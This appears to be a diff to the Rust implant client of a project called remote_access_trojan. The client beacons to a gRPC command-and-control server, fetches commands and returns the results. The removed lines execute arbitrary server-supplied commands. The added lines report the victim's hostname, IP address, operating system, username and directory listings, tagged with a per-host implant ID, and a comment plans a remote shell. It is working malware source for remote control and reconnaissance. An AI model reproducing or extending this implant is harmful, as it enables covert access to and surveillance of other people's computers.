@@ -1,6 +1,7 @@
-use remote_access_trojan::rat::ask_for_instructions_client::AskForInstructionsClient;
-use remote_access_trojan::rat::record_command_result_client::RecordCommandResultClient;
 use remote_access_trojan::rat::{Beacon, CommandResponse};
+use remote_access_trojan::rat::ask_for_instructions_client::AskForInstructionsClient;
+use remote_access_trojan::rat::RatCommand;
+use remote_access_trojan::rat::record_command_result_client::RecordCommandResultClient;
 use std::collections::hash_map::DefaultHasher;
 use std::hash::{Hash, Hasher};
 use std::process::Command;
@@ -14,11 +15,19 @@ Define what a command is, and get some cross platform definitions in place
     - help
     - change beacon cadence
     - drop into a shell 
-Make the beacons run in a loop
 Figure out the implementation of getting commands newer than last run
 Log actions on the server
 Have a real client do things
 */
+
+fn get_hostname() -> String {
+    let hostname = Command::new("hostname")
+                            .output()
+                            .unwrap();
+    let hostname = String::from_utf8(hostname.stdout).unwrap();
+    let hostname = hostname.trim();
+    hostname.to_string()
+}
 
 #[cfg(target_os = "linux")]
 fn get_ip_address() -> String {
@@ -65,26 +74,6 @@ fn get_directory_listing() -> String {
     directory.to_string()
 }
 
-fn calculate_hash<T: Hash>(t: &T) -> u64 {
-    let mut s = DefaultHasher::new();
-    t.hash(&mut s);
-    s.finish()
-}
-
-fn generate_implant_id() -> String {
-    let hostname = Command::new("hostname")
-                            .output()
-                            .unwrap();
-    let hostname = String::from_utf8(hostname.stdout).unwrap();
-    let hostname = hostname.trim();
-
-    // This will work on Linux. Need to do "ipconfig | findstr IPv4" or something similar on Windows
-    let ip_address = get_ip_address();
-
-    let hashed_value = calculate_hash(&format!("{hostname}:{ip_address}"));
-    format!("{hashed_value:x}")
-}
-
 #[cfg(target_os = "linux")]
 fn get_operating_system() -> String {
     let os = Command::new("cat")
@@ -107,6 +96,35 @@ fn get_operating_system() -> String {
     let os = String::from_utf8(os.stdout).unwrap();
     let os = os.trim();
     os.to_string()
+}
+
+fn get_username() -> String {
+    let username = Command::new("whoami")
+                            .output()
+                            .unwrap();
+    let username = String::from_utf8(username.stdout).unwrap();
+    let username = username.trim();
+    username.to_string()
+}
+
+fn calculate_hash<T: Hash>(t: &T) -> u64 {
+    let mut s = DefaultHasher::new();
+    t.hash(&mut s);
+    s.finish()
+}
+
+fn generate_implant_id() -> String {
+    let hostname = Command::new("hostname")
+                            .output()
+                            .unwrap();
+    let hostname = String::from_utf8(hostname.stdout).unwrap();
+    let hostname = hostname.trim();
+
+    // This will work on Linux. Need to do "ipconfig | findstr IPv4" or something similar on Windows
+    let ip_address = get_ip_address();
+
+    let hashed_value = calculate_hash(&format!("{hostname}:{ip_address}"));
+    format!("{hashed_value:x}")
 }
 
 #[tokio::main]
@@ -134,23 +152,104 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         let response = ask_client.send(request).await?.into_inner();
         println!("Response={response:?}");
 
-        let command_received = response.command;
-        if !command_received.is_empty() {
-            let command = Command::new(&command_received)
-                                .output()
-                                .unwrap();
-            let command_response = String::from_utf8(command.stdout).unwrap();
-            let result = tonic::Request::new(
-                CommandResponse {
-                    implant_id: implant_id.clone(),
-                    timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
-                    command: command_received,
-                    result: command_response
-                },
-            );
-            let response = response_client.send(result).await?.into_inner();
-            println!("{response:?}");
-        }
+        let command = RatCommand::from_i32(response.command).unwrap();
+        let result = match command {
+            RatCommand::Cadence => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: "PLACEHOLDER".to_string()
+                    },
+                )
+            },
+            RatCommand::Dir => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: get_directory_listing()
+                    },
+                )
+            },
+            RatCommand::Hostname => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: get_hostname()
+                    },
+                )
+            },
+            RatCommand::Ip => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: get_ip_address()
+                    },
+                )
+            },
+            RatCommand::Ls => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: get_directory_listing()
+                    },
+                )
+            },
+            RatCommand::Os => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: get_operating_system()
+                    },
+                )
+            },
+            RatCommand::Quit => {
+                break
+            },
+            RatCommand::Shell => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: "PLACEHOLDER".to_string()
+                    },
+                )
+            },
+            RatCommand::Whoami => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: get_username()
+                    },
+                )
+            },
+            _ => {
+                tonic::Request::new(
+                    CommandResponse {
+                        implant_id: implant_id.clone(),
+                        timestamp: SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs(),
+                        command: response.command,
+                        result: "Command received from server not implemented".to_string()
+                    },
+                )
+            }
+        };
+        let response = response_client.send(result).await?.into_inner();
+        println!("{response:?}");
         thread::sleep(cadence);
     }
 
